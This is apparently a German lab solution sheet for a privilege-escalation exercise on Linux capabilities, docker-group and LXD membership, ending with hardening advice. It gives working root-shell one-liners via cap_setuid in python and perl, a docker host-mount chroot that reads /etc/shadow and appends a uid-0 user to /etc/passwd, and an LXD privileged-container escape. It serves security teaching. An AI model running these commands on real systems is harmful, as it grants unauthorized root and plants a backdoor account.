# Lösung – Übung 07: Capabilities & Docker/LXD

## 1. Capabilities finden

```bash
getcap -r / 2>/dev/null
```
```
/usr/bin/python3.9 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```
Gefährlich: `cap_setuid`, `cap_dac_read_search`, `cap_dac_override`, `cap_sys_admin`.

## 2. cap_setuid → root

```bash
# python mit cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# perl:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# cap_dac_read_search (nur lesen) -> shadow lesen:
# z.B. tar/cat mit der Cap, dann Hashes cracken
```
`id` → `uid=0`.

## 3. docker-Gruppe → Host-root

```bash
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# jetzt bist du root im Host-Dateisystem unter chroot:
cat /etc/shadow
echo 'hacker:...:0:0::/root:/bin/bash' >> /etc/passwd   # oder SUID-bash setzen
```
Der Container läuft als root und `/` des Hosts ist gemountet → voller root-Zugriff auf den Host.

## 4. LXD-Ausbruch (Skizze)

```bash
# privilegiertes Image importieren, Host-/ mounten:
lxc init alpine r1 -c security.privileged=true
lxc config device add r1 host disk source=/ path=/mnt/root recursive=true
lxc start r1
lxc exec r1 /bin/sh
# -> /mnt/root ist das Host-FS als root
```

## 5. Warum docker = root & Härtung

Die `docker`-Gruppe darf den Docker-Daemon (läuft als root) steuern → beliebige Container mit Host-Mounts/Privilegien starten = **effektiv root auf dem Host**. Deshalb ist Gruppenmitgliedschaft `docker` sicherheitstechnisch = root.
**Härtung:**
- Niemanden unnötig in `docker`/`lxd`; stattdessen rootless-Docker/Podman.
- Capabilities minimieren (`setcap -r`), nur nötige Caps.
- Container: `--security-opt`, keine privilegierten Container, kein `/`-Mount; least privilege.

## Häufige Fehler / Troubleshooting

- **`getcap` leer:** keine Caps gesetzt → anderer Vektor.
- **docker „permission denied":** nicht in der Gruppe / Daemon nicht erreichbar → `id` prüfen.
- **chroot-Shell eingeschränkt:** `chroot /mnt /bin/bash`; Tools fehlen im Host-FS? anderes Image.
- **LXD-Image fehlt:** erst ein kleines Image (Alpine) bereitstellen/importieren.
